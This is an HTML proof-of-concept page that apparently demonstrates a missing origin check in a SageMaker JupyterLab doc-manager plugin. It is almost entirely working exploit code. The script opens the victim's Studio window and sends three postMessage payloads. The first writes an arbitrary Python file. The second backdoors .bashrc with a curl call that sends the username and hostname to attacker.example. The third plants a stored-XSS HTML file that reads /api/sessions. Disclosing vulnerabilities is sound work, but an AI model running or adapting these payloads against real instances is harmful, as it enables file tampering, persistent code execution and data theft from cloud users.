<!DOCTYPE html>
<html>
<head>
  <title>Finding 4 — postMessage File Write PoC</title>
  <style>
    body { font-family: monospace; background: #0a0a0a; color: #c0c0c0; padding: 30px; }
    h1 { color: #ff4444; font-size: 18px; }
    label { display: block; color: #888; font-size: 12px; margin-top: 10px; }
    input { width: 100%; background: #1a1a1a; border: 1px solid #444; color: #e0e0e0;
            padding: 8px; font-family: monospace; font-size: 13px; margin-top: 4px; }
    button { background: #ff4444; color: #fff; border: none; padding: 10px 25px;
             font-family: monospace; font-size: 14px; cursor: pointer; margin-top: 15px; }
    #status { margin-top: 15px; font-size: 13px; }
    .ok { color: #44ff44; } .err { color: #ff4444; } .warn { color: #ffaa00; }
  </style>
</head>
<body>
  <h1>CVE PoC: postMessage File Write (Finding 4)</h1>
  <p style="color:#666;font-size:12px">@amzn/sagemaker-ui-doc-manager-jl-plugin — missing origin validation</p>

  <label>Target JupyterLab URL:</label>
  <input id="url" value="https://XXXXX.studio.us-east-2.sagemaker.aws/jupyterlab/default/lab" />
  <label>File path to write:</label>
  <input id="path" value="pwned-by-postmessage.py" />
  <label>File content:</label>
  <input id="content" value="# PROOF: This file was written by an attacker-controlled page via cross-origin postMessage.&#10;# The SageMaker doc-manager plugin has no origin validation on its message handler.&#10;import os; print('EXPLOITED — running as:', os.popen('whoami').read())" />
  <label>Wait for Studio to load (ms):</label>
  <input id="wait" value="8000" />

  <button onclick="exploit()">Launch Exploit</button>
  <div id="status"></div>

<script>
function status(msg, cls) {
  document.getElementById('status').innerHTML += '<div class="' + (cls||'') + '">' + msg + '</div>';
}

function exploit() {
  var url = document.getElementById('url').value.trim();
  var path = document.getElementById('path').value.trim();
  var content = document.getElementById('content').value;
  var wait = parseInt(document.getElementById('wait').value) || 8000;

  // Phase 1: Open victim window
  var w = window.open(url, '_blank');
  if (!w) { status('Popup blocked — allow popups and retry.', 'err'); return; }
  status('Popup opened. Waiting ' + wait + 'ms for JupyterLab to load...', 'warn');

  setTimeout(function() {
    if (w.closed) { status('Popup was closed.', 'err'); return; }

    // Attack 1: Write attacker-controlled file (opens automatically in JupyterLab)
    w.postMessage({
      type: 'sagemaker:nbevent:OpenOrCreateFile',
      payload: { type: 'file', path: path, content: content, format: 'text' }
    }, '*');
    status('[1/3] Wrote ' + path + ' (arbitrary file write)', 'ok');

    // Attack 2: Backdoor .bashrc — executes next time victim opens a terminal
    setTimeout(function() {
      w.postMessage({
        type: 'sagemaker:nbevent:OpenOrCreateFile',
        payload: {
          type: 'file',
          path: '.bashrc',
          content: '# Backdoored via postMessage — no origin check\ncurl https://attacker.example/exfil?user=$(whoami)\\&host=$(hostname)',
          format: 'text'
        }
      }, '*');
      status('[2/3] Wrote .bashrc (RCE on next terminal open)', 'ok');
    }, 500);

    // Attack 3: Drop stored XSS .html — auto-opens in JupyterLab
    setTimeout(function() {
      w.postMessage({
        type: 'sagemaker:nbevent:OpenUntitledFile',
        payload: {
          type: 'file', ext: '.html', path: '',
          content: '<h1>Stored XSS via postMessage</h1>'
            + '<script>fetch("/api/sessions").then(r=>r.json()).then(d=>'
            + 'document.write("<pre>"+JSON.stringify(d,null,2)+"</pre>"))<\/script>',
          format: 'text'
        }
      }, '*');
      status('[3/3] Wrote untitled .html (stored XSS, leaks /api/sessions)', 'ok');
      status('Done. All 3 payloads delivered.', 'warn');
    }, 1000);
  }, wait);
}
</script>
